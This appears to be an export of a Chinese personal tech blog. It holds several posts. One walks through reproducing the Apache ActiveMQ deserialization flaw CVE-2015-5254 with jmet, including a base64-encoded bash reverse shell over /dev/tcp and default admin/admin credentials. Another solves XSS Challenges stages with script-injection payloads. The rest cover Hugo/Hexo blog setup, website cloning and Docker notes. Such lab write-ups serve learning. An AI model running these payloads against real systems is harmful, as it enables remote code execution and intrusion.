[{"content":"Web服务器漏洞 Apache Apache ActiveMQ 反序列化漏洞 CVE-2015-5254 漏洞描述 Apache ActiveMQ是Apache软件经济会研发的一套开源消息中间件，支持Java消息服务、集群、Spring Framework等。Apache ActiveMQ 5.13.0之前版本，即5.x版本中存在反序列化漏洞，该漏洞源于程序没有限制可在代理中序列化的类，攻击者可借助特制的序列化Java消息服务(JMS) ObjectMessage对象利用该漏洞执行任意代码。\n漏洞影响 Apache ActiveMQ 5.13.0之前的5.x版本。\n复现思路 1.构造(可使用ysoserial)可执行命令的序列化对象。\n2.作为一个消息，发送给目标61616端口。\n3.访问web管理页面，读取消息，触发漏洞。\n漏洞复现 使用jmet进行漏洞利用:https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar\n 下载好之后在jmet-0.1.0-all.jar同级目录下创建external文件夹，避免出现文件夹不存在的报错。\njmet的原理是使用jar包内置ysoserial生成Payload并发送，我们需要在ysoserial的gadget选择一个可使用的，如ROME。\n 给目标ActiveMQ添加一个名为event的队列，点击事件为生成/tmp/vuln文件:\njava -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y \u0026#34;touch /tmp/vuln\u0026#34; -Yp ROME \u0026lt;ip\u0026gt; 61616 # 命令执行成功后回显如下 INFO d.c.j.t.JMSTarget [main] Connected with ID: ID:\u0026lt;server-id\u0026gt; INFO d.c.j.t.JMSTarget [main] Sent gadget \u0026#34;ROME\u0026#34; with command: \u0026#34;touch /tmp/vuln\u0026#34; INFO d.c.j.t.JMSTarget [main] Shutting down connection ID:\u0026lt;server-id\u0026gt; 访问http://xxx.xxx.xxx.xxx:8161/admin/browse.jsp?JMSDestination=event查看消息队列\n# 访问页面需要登录，默认账密如下\radmin/admin\r点击页面Message ID下的ID:server-id字段，成功触发文件创建。\n# 查看命令是否执行成功 ls /tmp 确认/tmp/vuln文件存在后即可进一步创建反弹shell。\nbash -i \u0026gt;\u0026amp; /dev/tcp/\u0026lt;ip\u0026gt;/\u0026lt;port\u0026gt; 0\u0026gt;\u0026amp;1 # Base64编码 YmFzaCAtaSA+JiAvZGV2L3RjcC88aXA+Lzxwb3J0PiAwPiYx bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC88aXA+Lzxwb3J0PiAwPiYx}|{base64,-d}|{bash,-i} # 发送payload java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y \u0026#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC88aXA+Lzxwb3J0PiAwPiYx}|{base64,-d}|{bash,-i}\u0026#34; -Yp ROME \u0026lt;ip\u0026gt; 61616 # INFO如下 INFO d.c.j.t.JMSTarget [main] Connected with ID: ID:\u0026lt;server-id\u0026gt; INFO d.c.j.t.JMSTarget [main] Sent gadget \u0026#34;ROME\u0026#34; with command: \u0026#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjExNi4yMzMuNzYvODg4MyAwPiYx}|{base64,-d}|{bash,-i}\u0026#34; INFO d.c.j.t.JMSTarget [main] Shutting down connection ID:\u0026lt;server-id\u0026gt; 执行成功后，在监听端打开nc:\nnc -lvvp \u0026lt;port\u0026gt; 继续到http://xxx.xxx.xxx.xxx:8161/admin/browse.jsp?JMSDestination=event页面，点击字段触发反弹shell，成功连接。\n","permalink":"https://oopsdc.github.io/post/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","summary":"Web服务器漏洞 Apache Apache ActiveMQ 反序列化漏洞 CVE-2015-5254 漏洞描述 Apache ActiveMQ是Apache软件经济会研发的一套开源消息中间件，支持Java消息服务、集群、Spring Framework等。Apache ActiveMQ 5.13.0之前版本，即5.x版本中存在反序列化漏洞，该漏洞源于程序没有限制可在代理中序列化的类，攻击者可借助特制的序列化Java消息服务(JMS) ObjectMessage对象利用该漏洞执行任意代码。\n漏洞影响 Apache ActiveMQ 5.13.0之前的5.x版本。\n复现思路 1.构造(可使用ysoserial)可执行命令的序列化对象。\n2.作为一个消息，发送给目标61616端口。\n3.访问web管理页面，读取消息，触发漏洞。\n漏洞复现 使用jmet进行漏洞利用:https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar\n 下载好之后在jmet-0.1.0-all.jar同级目录下创建external文件夹，避免出现文件夹不存在的报错。\njmet的原理是使用jar包内置ysoserial生成Payload并发送，我们需要在ysoserial的gadget选择一个可使用的，如ROME。\n 给目标ActiveMQ添加一个名为event的队列，点击事件为生成/tmp/vuln文件:\njava -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y \u0026#34;touch /tmp/vuln\u0026#34; -Yp ROME \u0026lt;ip\u0026gt; 61616 # 命令执行成功后回显如下 INFO d.c.j.t.JMSTarget [main] Connected with ID: ID:\u0026lt;server-id\u0026gt; INFO d.c.j.t.JMSTarget [main] Sent gadget \u0026#34;ROME\u0026#34; with command: \u0026#34;touch /tmp/vuln\u0026#34; INFO d.c.j.t.JMSTarget [main] Shutting down connection ID:\u0026lt;server-id\u0026gt; 访问http://xxx.xxx.xxx.xxx:8161/admin/browse.jsp?JMSDestination=event查看消息队列","title":"漏洞复现"},{"content":"博客搭建 hugo Hugo官方网站:https://gohugo.io\n本文以PaperMod主题为例，官方文档:Installation · adityatelange/hugo-PaperMod Wiki (github.com)\n需求准备 Hugo:Releases · gohugoio/hugo (github.com)\n安装步骤 1.解压压缩包 2.配置环境变量 D:\\Env\\hugo_0.83.1\r3.初始化博客 官方文档推荐我们使用易读性更高的yml格式初始化博客。\nhugo new site \u0026lt;name of site\u0026gt; -f yml\r4.指定主题 在config.yml文件中设置主题。\ntheme: PaperMod\r5.本地启动 先在本地看看网站跑起来的效果\nhugo server\r6.创建GitHub仓库 具体操作详见之后的hexo主题教学。\n7.修改baseUrl 将config.yml文件中的baseUrl修改为刚刚创建的仓库。\nbaseURL: \u0026quot;https://\u0026lt;username\u0026gt;.github.io/\u0026quot;\r8.生成public文件夹 public中包含所有静态页面的内容，我们需要生成这个文件夹并上传到远程仓库中，完成博客部署。\nhugo\r9.push到远程仓库 # 配置代理 git config --global http.proxy socks5://127.0.0.1:port git config --global https.proxy socks5://127.0.0.1:port # 更改默认分支 git push -u origin main # push文件 cd public git init git add . git remote add origin https://github.com/\u0026lt;username\u0026gt;/\u0026lt;username\u0026gt;.github.io.git git commit -m \u0026#34;first commit\u0026#34; git push -u origin main 更新博客 # 重新生成public文件夹 hugo # 重新push到GitHub cd public/ git init git add . git commit -m \u0026#34;修改内容\u0026#34; git push -u origin main 俗话说，偷懒是第一创造力，上面的命令完全可以写一个bash脚本，这里命名为deploy.sh。\n# !/bin/bash hugo cd public git add -A \u0026amp;\u0026amp; git commit -m \u0026#34;update\u0026#34; \u0026amp;\u0026amp; git push -u origin main  写好bash脚本后，记得chmod +x deploy.sh给脚本执行权限\n 日常排错 在push的时候报错了，报错如下：\n ! [rejected] main -\u0026gt; main (fetch first)\rerror: failed to push some refs to 'https://github.com/oopsdc/oopsdc.github.io.git'\rhint: Updates were rejected because the remote contains work that you do\rhint: not have locally. This is usually caused by another repository pushing\rhint: to the same ref. You may want to first integrate the remote changes\rhint: (e.g., 'git pull ...') before pushing again.\rhint: See the 'Note about fast-forwards' in 'git push --help' for details.\r出错原因：\nGitHub中有文件不在本地代码目录中。\n解决方案：\n# 进行代码合并 git pull --rebase origin main 常用命令 生成文章 hugo new --kind post \u0026lt;name\u0026gt; hexo 需求准备 git:https://git-scm.com/\nnodejs:http://nodejs.cn/\ngit --version # 检测git是否安装成功 node -v # 检测nodejs是否安装成功 连接GitHub  为方便后续操作，之后的命令使用gitbash\n 配置个人信息 git config --global user.name \u0026#34;\u0026lt;username\u0026gt;\u0026#34; git config --global user.email \u0026#34;\u0026lt;email\u0026gt;\u0026#34; 生成SSH ssh-keygen -t rsa -C \u0026#34;email\u0026#34; # 后续选项默认回车 该命令会在用户文件夹下的.ssh文件夹生成id_rsa和id_rsa.pub文件，前者为私钥，后者为公钥。接下来我们把公钥提交到GitHub。\ncat ~/.ssh/id_rsa.pub # 查看公钥 登录GitHub：\n取一个合适的名称，将cat命令查看到的内容粘贴进去。\n完成上述步骤后我们检查一下连接是否成功：\nssh -T git@github.com # 出现后续的提示即为连接成功 # Hi oopsdc! You\u0026#39;ve successfully authenticated, but GitHub does not provide shell access. 创建博客仓库 博客部署 安装hexo npm i hexo-cli -g # 全局安装 初始化博客文件夹 hexo init \u0026lt;blog-name\u0026gt; cd \u0026lt;blog-name\u0026gt; # 切换到博客根目录 npm install # 安装依赖 本地启动 hexo s # hexo server命令简写 我们可以看到博客本地部署成功，接下来就是换主题。\n本文以yun主题为例：\n项目官网:https://yun.yunyoujun.cn/\nGitHub项目地址:https://github.com/YunYouJun/hexo-theme-yun\n下载后将文件解压，将文件夹重命名为yun。\n修改博客根目录下的_config.yml文件，自定义主题，此处填写的主题名就是我们刚刚解压缩的文件夹名称。\nCtrll+F搜索theme，然后进行修改：\n完成上述步骤后，我们返回gitbash，Ctrl+C结束当前调试，重新运行本地文件。\n刷新网页后看到了这个报错，按照提示安装hexo-render-pug即可：\nnpm install hexo-render-pug 在安装过程中还有其它提醒：\n# Please, upgrade your dependencies to the actual version of core-js@3. # found 1 high serverity vulnerablity run `npm audit fix` to fix them, or `npm audit` for details 依次解决：\nnpm install --save -g core-js@^3 npm audit fix 安装后依旧报错：\nWARN No layout: index.html\r查了资料，不缺插件，文件夹也是正确的，实在不知道什么错，就在_config.yml和theme下分别把yun和yun文件夹都改为了theme-yun，然后正常运行。但是改回yun又会报错\u0026hellip;先暂时不讨论这个问题了。\n这就是博客初始页面。\n剩下的完全可以按照官方文档自己操作，自定义想要的功能。\n修改完且本地测试无误后，我们就可以正式把博客发布到GitHub上了。\n首先还是编辑根目录下的_config.yml文件，直接翻到最后。\ndeploy: type: \u0026#39;git\u0026#39; repository: https://github.com/\u0026lt;username\u0026gt;/\u0026lt;usernmae\u0026gt;.github.io branch: main 部署博客 部署博客需要使用命令hexo deploy，但需要安装对应平台的插件。\n以GitHub为例，安装如下：\nnpm install hexo-deployer-git --save 本地测试没有问题时，即可部署，部署时建议先清除以往数据并重新生成，避免未知错误。\nhexo clean \u0026amp;\u0026amp; hexo g -d\r配置域名 首先自己去买一个，然后按照对应的官方文档设置DNS等参数，然后点击博客仓库的Settings→GitHub Pages→Check it out here!，之后自定义域名即可。\n优化访问 CDN加速 由于博客部署在GitHub，访问极不稳定，所以使用了Cloudflare的服务。\nhexo常用命令 hexo clean # 清除已生成的静态站点文件 hexo generate # 生成静态站点文件，生成内容在public文件夹内 hexo g # 上一条命令的简写 hexo server # 启动本地服务器 hexo s # 上一条命令的简写 hexo deploy # 生成静态站点文件后部署网站 hexo clean \u0026amp;\u0026amp; hexo g \u0026amp;\u0026amp; hexo s # 本地测试 升级hexo # 使用淘宝源的cnpm替换npm npm install -g cnpm --registry=https://registry.npm.taobao.org cnpm install -g npm # 升级npm cnpm cache clean -f # 清除npm缓存 # 更新hexo:进入\u0026lt;blog\u0026gt;目录，执行如下命令: # 更新package.json中的hexo插件版本 cnpm install -g npm-check cnpm install -g npm-upgrade npm-check npm-upgrade # 更新npm所有插件 cnpm update # 检查hexo版本 hexo -v 创建文章\u0026amp;页面 hexo new \u0026#34;\u0026lt;post\u0026gt;\u0026#34; # 在博客根目录/source/_posts文件夹下按格式生成md文件 hexo new \u0026lt;page-name\u0026gt; # 生成对应页面，具体参考官方文档 日常排错 部署报错 问题描述：本地测试毫无问题，但是部署时反复报错，以下列出我尝试的解决方案。\n 方法一\n 删除博客根目录文件下的.deploy-git文件夹，然后重新部署。\nhexo clean \u0026amp;\u0026amp; hexo g -d  方法二\n 检查自己提交的分支是否和GitHub上的仓库分支一致。\n 方法三\n 网上能搜的我都搜了\u0026hellip;然后试了试特仑苏大佬说的挂个代理。因为本地部署没问题，问题只可能出在网络上。\n打开gitbash设置代理:\nvim ~/.gitconfig # 修改git配置文件 # 添加代理 [http \u0026#34;http://github.com\u0026#34;] proxy = socks5://127.0.0.1:\u0026lt;port\u0026gt; [https \u0026#34;https://github.com\u0026#34;] proxy = socks5://127.0.0.1:\u0026lt;port\u0026gt; 10808端口是v2ray的默认端口，具体的可以在参数设置里面查看。\n至此，博客成功部署。\nPicGo+Gitee构建图床 用Typora写博客需要图床，图片放在GitHub加载太慢(最近在学校经常被墙)。\n需求准备：\n PicGo Gitee Typora  PicGo\u0026amp;Gitee配置 一路安装即可，如需更改路径请自行选择，接下来以PicGo.app为例，版本2.2.2。\n我们首先安装对应插件。\n安装好之后进入PicGo设置，勾选gitee选项。\n下一步进入图床设置下的gitee，我的设置如图。\nrepo\t:\t用户名/仓库名\rbranch\t:\t分支\rtoken\t:\t个人口令\rpath\t:\t仓库下的二级文件夹\rcustomPath\t:\t自定义路径\rcustomUrl\t:\t自定义URL\r填写完以上参数后，我们首先创建对应仓库。\n此处我是填写了二级文件夹的，那么我们就需要创建对应文件夹。\n最后就是token申请，(注：token只会在申请时显示一次，若此处未复制token则只能重新申请)：\n走到这里的话，我们已经能通过PicGo上传图片到Gitee对应仓库了。\nTypora配置 首先附上官方文档，不论做什么，查看官方文档都是一个好习惯。\n打开Typora，进入偏好设置。\n至此，在Typora插入图片时就会自动上传到GItee仓库图床。\n","permalink":"https://oopsdc.github.io/post/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/","summary":"博客搭建 hugo Hugo官方网站:https://gohugo.io\n本文以PaperMod主题为例，官方文档:Installation · adityatelange/hugo-PaperMod Wiki (github.com)\n需求准备 Hugo:Releases · gohugoio/hugo (github.com)\n安装步骤 1.解压压缩包 2.配置环境变量 D:\\Env\\hugo_0.83.1\r3.初始化博客 官方文档推荐我们使用易读性更高的yml格式初始化博客。\nhugo new site \u0026lt;name of site\u0026gt; -f yml\r4.指定主题 在config.yml文件中设置主题。\ntheme: PaperMod\r5.本地启动 先在本地看看网站跑起来的效果\nhugo server\r6.创建GitHub仓库 具体操作详见之后的hexo主题教学。\n7.修改baseUrl 将config.yml文件中的baseUrl修改为刚刚创建的仓库。\nbaseURL: \u0026quot;https://\u0026lt;username\u0026gt;.github.io/\u0026quot;\r8.生成public文件夹 public中包含所有静态页面的内容，我们需要生成这个文件夹并上传到远程仓库中，完成博客部署。\nhugo\r9.push到远程仓库 # 配置代理 git config --global http.proxy socks5://127.0.0.1:port git config --global https.proxy socks5://127.0.0.1:port # 更改默认分支 git push -u origin main # push文件 cd public git init git add .","title":"博客搭建"},{"content":"题目地址：https://xss-quiz.int21h.jp/\nStage #1 Hint: Very simple\u0026hellip;\n直接输入测试语句：\nStage #2 Hint: Close the current tag and add SCRIPT tag\u0026hellip;\n上测试语句：\n然后审查元素，只需要把input标签闭合就能执行我们的语句了。\n\u0026ldquo;\u0026gt;alert(document.domain);Stage #3 Hint: The input in text box is properly escaped.\n这个页面有两个input标签，先在搜索框输入我们的测试语句试试。\n直接把我们的语句放到标签里了，但是这旁边不是还有一个input标签吗。把两者的name互换一下即可。\nStage #4 Hint: Invisible input field.\n审查元素发现有三个input标签，第三个标签的属性是hidden，这里把它改为text，然后把input标签闭合，之后放上我们的语句即可。\n\u0026ldquo;\u0026gt;alert(document.domain);Stage #5 Hint: Length limited text box.\n审查元素，发现搜索框的长度被限制，修改maxlength的值即可。\n\u0026ldquo;\u0026gt;alert(document.domain);Stage #6 Hint: Event handler attributes.\n输入测试语句：\n\u0026ldquo;\u0026gt;alert(document.domain);发现尖括号和斜杠被转义了，那我们就使用不带尖括号的语句。\n\u0026lsquo;\u0026rdquo; onload=\u0026ldquo;alert(document.domain);\u0026quot;\u0026rsquo;\nStage #7 Hint:Nearly the same\u0026hellip; but a bit more tricky.\n审查元素，发现Hint元素旁边有一个隐藏的输入框，将其属性修改为text，并将value设置如下：\n‘”onmouseover=\u0026ldquo;alert(document.domain);\u0026quot;'\n","permalink":"https://oopsdc.github.io/post/xss-challenges/","summary":"题目地址：https://xss-quiz.int21h.jp/\nStage #1 Hint: Very simple\u0026hellip;\n直接输入测试语句：\nStage #2 Hint: Close the current tag and add SCRIPT tag\u0026hellip;\n上测试语句：\n然后审查元素，只需要把input标签闭合就能执行我们的语句了。\n\u0026ldquo;\u0026gt;alert(document.domain);Stage #3 Hint: The input in text box is properly escaped.\n这个页面有两个input标签，先在搜索框输入我们的测试语句试试。\n直接把我们的语句放到标签里了，但是这旁边不是还有一个input标签吗。把两者的name互换一下即可。\nStage #4 Hint: Invisible input field.\n审查元素发现有三个input标签，第三个标签的属性是hidden，这里把它改为text，然后把input标签闭合，之后放上我们的语句即可。\n\u0026ldquo;\u0026gt;alert(document.domain);Stage #5 Hint: Length limited text box.\n审查元素，发现搜索框的长度被限制，修改maxlength的值即可。\n\u0026ldquo;\u0026gt;alert(document.domain);Stage #6 Hint: Event handler attributes.\n输入测试语句：\n\u0026ldquo;\u0026gt;alert(document.domain);发现尖括号和斜杠被转义了，那我们就使用不带尖括号的语句。\n\u0026lsquo;\u0026rdquo; onload=\u0026ldquo;alert(document.domain);\u0026quot;\u0026rsquo;\nStage #7 Hint:Nearly the same\u0026hellip; but a bit more tricky.\n审查元素，发现Hint元素旁边有一个隐藏的输入框，将其属性修改为text，并将value设置如下：\n‘”onmouseover=\u0026ldquo;alert(document.domain);\u0026quot;'","title":"XSS Challenges"},{"content":"He11o, th1s 1s a test!\n#include \u0026lt;stdio.h\u0026gt;int main() { pritnf(\u0026#34;Hello World!\u0026#34;); } ","permalink":"https://oopsdc.github.io/post/test/","summary":"He11o, th1s 1s a test!\n#include \u0026lt;stdio.h\u0026gt;int main() { pritnf(\u0026#34;Hello World!\u0026#34;); } ","title":"Test"},{"content":"使用wget克隆网站 使用方法 我们可以使用man wget命令查看帮助文档。\n操作命令及参数解释如下：\nwget -m -p -E -k -K -np -v https://www.baidu.com/ # 参数解释 -m\t:\t镜像，选择该选项适用于Web站点 -p\t:\t页面获取的先决条件，该选项确保包含了请求的图片和css脚本文件被下载(可以更好复制html5站点) -E\t:\t适用于拓展，可以在本地另存一个html文件 -k\t:\t转换链接，确保文件本转换，适用于本地浏览 -K\t:\t转换备份文件，将以orig为后缀作为原始文件 -np\t:\t不要到上一层子目录中 -v\t:\t显示过程，不显示过程为-nv 克隆结果 # 克隆后在当前目录下会出现一个与网站同名的子目录，树形结构如下 www.baidu.com ├── index.html ├── index.html.orig └── robots.txt 0 directories, 3 files 使用HTTrack克隆网站 使用方法 httrack # 进入软件后需要输入项目名 baidu # 克隆后的存放地址 /home/oopsdc/Desktop # 要克隆的网站地址 www.baidu.com # 有6个选项，此处我们选2，具有向导递归层级的镜像网站 2 # 接下来的部分全选默认选项 默认回车 克隆结果 baidu ├── backblue.gif ├── cookies.txt ├── fade.gif ├── hts-cache [error opening dir] ├── hts-log.txt ├── index.html └── www.baidu.com ├── index.html ├── s2d49.html ├── s2f7f.html ├── s412d.html ├── s5084.html ├── s5e09.html ├── s6fa8.html └── sa132.html 2 directories, 13 files ","permalink":"https://oopsdc.github.io/post/%E7%BD%91%E7%AB%99%E9%95%9C%E5%83%8F%E5%85%8B%E9%9A%86/","summary":"使用wget克隆网站 使用方法 我们可以使用man wget命令查看帮助文档。\n操作命令及参数解释如下：\nwget -m -p -E -k -K -np -v https://www.baidu.com/ # 参数解释 -m\t:\t镜像，选择该选项适用于Web站点 -p\t:\t页面获取的先决条件，该选项确保包含了请求的图片和css脚本文件被下载(可以更好复制html5站点) -E\t:\t适用于拓展，可以在本地另存一个html文件 -k\t:\t转换链接，确保文件本转换，适用于本地浏览 -K\t:\t转换备份文件，将以orig为后缀作为原始文件 -np\t:\t不要到上一层子目录中 -v\t:\t显示过程，不显示过程为-nv 克隆结果 # 克隆后在当前目录下会出现一个与网站同名的子目录，树形结构如下 www.baidu.com ├── index.html ├── index.html.orig └── robots.txt 0 directories, 3 files 使用HTTrack克隆网站 使用方法 httrack # 进入软件后需要输入项目名 baidu # 克隆后的存放地址 /home/oopsdc/Desktop # 要克隆的网站地址 www.baidu.com # 有6个选项，此处我们选2，具有向导递归层级的镜像网站 2 # 接下来的部分全选默认选项 默认回车 克隆结果 baidu ├── backblue.","title":"网站镜像克隆"},{"content":"Docker概述 镜像(image)：\n一个只读模板。一个镜像可以用来创建多个Docker容器，好似Java中的类和对象，镜像是类，容器是对象。\r容器(container)：\nDocker利用容器独立运行一个或一组应用，容器是用镜像创建的运行实例。\r容器可以被启动、开始、停止、删除。\r每个容器都是相互个隔离的。\r也可以把容器看做一个简易版Linux环境(包括root用户权限、进程空间、用户空间和网络空间等)及运行在其中的应用程序。\r容器的定义和镜像几乎一模一样，也是一堆层的统一视角，唯一区别在于容器最上面一层可读可写。\r仓库(repository)：\n仓库是集中存放镜像文件的场所。\r仓库和仓库注册服务器(registry)是有区别的，后者往往存在多个仓库，每个仓库又存在多个镜像，每个镜像有不同的标签。\r仓库分为公开仓库和私有仓库两种形式。\r最大的公开仓库是Docker Hub，国内最大的为阿里云、网易云等。\rDocker安装  环境：CentOS 7\n 1.官方文档\n2.yum安装gcc相关环境\nyum -y install gcc yum -y install gcc-c++ 3.卸载旧版本\nyum remove docker \\ \tdocker-client \\ \tdocker-client-latest \\ \tdocker-common \\ \tdocker-latest \\ \tdocker-latest-logrotate \\ \tdocker-logrotate \\ \tdocker-engine 4.安装依赖包\nyum install -y yum-utils 5.设置镜像仓库\n# 错误 yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo ## 报错 [Errno 14] curl#35 - TCP connection reset by peer [Errno 12] curl#35 - Timeout # 推荐国内镜像 yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo 6.更新yum软件包索引\nyum makecache fast 7.安装Docker CE\nyum install docker-ce docker-ce-cli containerd.io 8.启动Docker\nsystemctl start docker 9.测试命令\ndocker version # 查看Docker版本 docker run hello-world # 拉取镜像 docker images # 查看本地镜像 Docker卸载 systemctl stop docker\ryum -y remove docker-ce docker-ce-cli containerd.io\rrm -rf /var/lib/docker\rDocker换源 # 创建或修改/etc/docker/daemon.json文件 vim /etc/docker/daemon.json { \u0026#34;registry-mirrors\u0026#34;: [\u0026#34;https://registry.docker-cn.com\u0026#34;] } systemctl daemon-reload systemctl restart docker.service # 网易 http://hub-mirror.c.163.com # ustc https://docker.mirrors.ustc.edu.cn # 中国科技大学 https://docker.mirrors.ustc.edu.cn # 阿里云容器 服务 https://cr.console.aliyun.com/ # 首页点击“创建我的容器镜像” 得到一个专属的镜像加速地址，类似于“https://1234abcd.mirror.aliyuncs.com” nginx安装 tomcat安装 部署es+kibana # es暴露的端口很多，十分耗内存，数据一般需要放置到安全目录 # 启动es docker run -d --name elasticsearch --net somenetwork -p 9200:9200 -p 9300:9300 -e \u0026#34;discovery.type=single-node\u0026#34; elasticsearch:latest # --net somenetwork 网络配置 # 查看CPU状态 docker stats # 运行环境修改 docker run -d --name elasticsearch --net somenetwork -p 9200:9200 -p 9300:9300 -e \u0026#34;discovery.type=single-node\u0026#34; -e ES_JAVA_OPTS=\u0026#34;-Xms64m -Xmx512m\u0026#34; elasticsearch:latest Portainer安装 Docker图形化管理工具，提供一个后台面板。\ndocker run -d -p 8088:9000 --restart=always -v /var/run/docker.sock:/var/run/docker.sock --privileged=true portainer/portainer Rancher(CI/CD再用)\nDocker镜像讲解 镜像是什么 镜像是一种轻量级、可执行的独立软件包，用来打包软件运行环境和基于运行环境开发的软件，包含运行某个软件所需的所有内容，包括代码、运行时、库、环境变量和配置文件。\n所有应用直接打包Docker镜像。\n如何得到镜像：\n 官方下载 朋友分享 自己制作  Docker镜像加载原理  UnionFS(联合文件系统)\n 我们下载的时候看见的一层层就是这个。\n是一种分层、轻量级且高性能的文件系统，支持对文件系统的修改作为一次提交来层层叠加，同时可以将不同目录挂载到同一个虚拟文件系统下(unite several directions into a single virtual filesystem)。Union文件系统是Docker镜像的基础，镜像可以通过分层来进行继承，基于基础镜像(没有父镜像)，可以制作各种具体的应用镜像。\n特性：一次同时加载多个文件系统，但从外面只能看到一个文件系统，联合加载会把各层文件系统叠加起来，这样最终的文件系统会包含所有底层的文件和目录。\n Docker镜像加载原理\n Docker的镜像实际上由一层层文件系统组成，这种层级的文件系统称为UnionFS。\nbootfs(boot file system)主要包含bootloader和kernel，bootloader主要引导加载kernel，Linux刚启动时会加载bootfs文件系统，在Docker镜像的最底层是bootfs。这一层与我们典型的Linux/Unix系统一样，包含boot加载器和内核。boot加载完成后整个内核都在内存中，此时内存的使用权已转交给内核，此时系统也会卸载bootfs。\nrootfs，在bootfs之上。包含的就是典型Linux系统中的/dev，/proc，/bin，/etc等标准目录和文件。rootfs就是各种不同的操作系统发行版，如Ubuntu、CentOS等。\n对于一个精简的OS，rootfs可以很小，只需包含最基本的命令、工具和程序库即可，因为底层直接用Host的kernel，自己只需提供rootfs。可见对于不同的Linux发行版，bootfs基本一致，rootfs会有差别，因此不同的发行版可以公用bootfs。\n分层理解 为什么Docker镜像采用分层结构？\n资源共享，如有多个镜像都从相同的Base镜像构建而来，那么宿主机只需在磁盘上保留一份Base镜像，内存中也只需加载一份Base镜像，这样就可以为所有的容器服务了，且镜像的每一层都可以被共享。\n使用docker image inspect查看镜像分层。\n 特点\n Docker镜像一般都是只读的，当容器启动时，一个新的可写层被加载到镜像顶部。\n这一层就是我们常说的容器层，容器之下的都叫镜像层。\ncommit镜像 docker commit #提交容器成为一个新的版本 # 命令和git原理类似 docker commit -m=\u0026#34;description\u0026#34; -a=\u0026#34;author\u0026#34; id target_image_name:[TAG] 实战测试\ndocker run -it -p 8080:8080 tomcat # 将webapps.dist所有文件拷贝到webapps cp -r webapps.dist/* webapps # 将修改后的容器通过commit提交为一个新的镜像 docker commit -a=\u0026#34;dc\u0026#34; -m=\u0026#34;add webapps\u0026#34; id name:version 容器数据卷 什么是容器数据卷？ Docker的理念：将应用和环境打包成一个镜像。\n如果数据都在容器中，容器一删除则数据消失。\n需求：数据持久化。\n容器之间需要有一个数据共享技术。\nDocker容器中产生的数据同步到本地。\n这就是卷技术，目录挂载，将容器内目录挂载到虚拟机或Linux中。\n总结：容器的持久化和同步操作。容器间也可以数据共享。\n使用数据卷  使用命令挂载\n docker run -it -v 主机内目录:容器内目录 docker run -it -v /home/test_real:/home centos /bin/bash # 宿主机查看挂载状态 docker inspect container-id \u0026#34;Mounts\u0026#34;: [ { \u0026#34;Type\u0026#34;: \u0026#34;bind\u0026#34;, \u0026#34;Source\u0026#34;: \u0026#34;/home/test_real\u0026#34;, \u0026#34;Destination\u0026#34;: \u0026#34;/home\u0026#34;, \u0026#34;Mode\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;RW\u0026#34;: true, \u0026#34;Propagation\u0026#34;: \u0026#34;rprivate\u0026#34; } ] # 退出容器 exit # 修改文件内容 vim testfile # 重新打开容器 docker start container-id # 进入容器 docker attach container-id #未start报错:You cannot attach to a stopped container, start it first MySQL安装 思考：MySQL数据持久化问题。\n# 拉取MySQL docker pull mysql # 官方启动:docker run --name some-mysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql:tag # 运行容器并做数据挂载 docker run -d -p 3310:3306 -v /home/mysql_real/conf:/etc/mysql/conf.d -v /home/mysql_real/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 mysql 具名和匿名挂载 # 匿名挂载 -v 容器内路径 docker run -d -P --name name -v /etc/nginx nginx # -P:随机映射端口 # 查看所有的volume情况 docker volume ls # 具名挂载 docker run -d -P --name name -v juming-nginx:/etc/nginx nginx 所有Docker容器内的卷，没有指定目录的情况下都在/var/lib/docker/volumes/xxx/_data。\n通过具名挂载可以方便的找到我们的一个卷，大多数情况使用具名挂载。\n# 如何确定匿名挂载还是具名挂载，还是指定路径挂载 -v 容器内路径 # 匿名挂载 -v 卷名:容器内路径 # 具名挂载 -v /宿主机路径:容器内路径 # 指定路径挂载 拓展：\n# 通过-v容器内路径:ro/rw改变读写权限 docker run -d -P --name name -v juming-nginx:/etc/nginx:ro nginx # 只能通过宿主机操作，容器内部无法操作 docker run -d -P --name name -v juming-nginx:/etc/nginx:rw nginx 初识Dockerfile Dockerfile就是用来构建Docker镜像的构建文件。其实就是命令脚本，通过这个脚本可以生成镜像。\n镜像是一层层的，脚本就是一个个的命令，每个命令就是一层。\n# 创建一个dockerfile文件 # 指令(大写) 参数 FROM centos VOLUME[\u0026#34;volume01\u0026#34;,\u0026#34;volume02\u0026#34;] # 匿名挂载，和外部一定有一个同步目录 CMD echo \u0026#34;-----end-----\u0026#34; CMD /bin/bash # 使用 docker build -f dockerfile1 -t dc/centos . # 查看容器本地卷信息，测试文件是否同步 docker inspect -f \u0026#34;{{.Monuts}}\u0026#34; id 这种方式使用十分多，因为我们通常会构建自己的镜像。\n假设构建镜像的时候没有挂载卷，要手动镜像挂载，-v 卷名:容器内路径。\n数据卷容器 多个MySQL实现数据共享。\ndocker run -d -p 3310:3306 -v /etc/mysql/conf.d -v /var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name mysql01 mysql docker run -d -p 3310:3306 -e MYSQL_ROOT_PASSWORD=123456 --name mysql02 --volumes-from mysql01 mysql 容器之间配置信息的传递，数据卷容器的生命周期一直持续到无人使用为止。\n一旦持久化到了本地，这个时候本地数据不会删除。\nDockerFile 核心是用来构建Docker镜像的文件。是一个命令参数脚本。\n构建步骤：\n 编写一个Dockerfile文件 docker build构建成为一个镜像 docker run运行镜像 docker push发布镜像(DockerHub、阿里云镜像仓库)  DockerFile构建过程 基础知识：\n 每个保留关键字(指令)都必须为大写字母 执行顺序由上至下 #为注释 每个指令都会创建提交一个新镜像层并提交  